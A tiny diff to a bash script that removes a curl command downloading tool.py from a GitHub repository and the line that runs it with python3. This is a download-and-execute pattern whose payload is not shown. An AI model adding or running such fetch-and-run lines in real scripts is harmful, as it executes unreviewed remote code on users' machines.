@@ -1,3 +1,2 @@
 #!/bin/bash
-curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/tool.py
-python3 tool.py
+
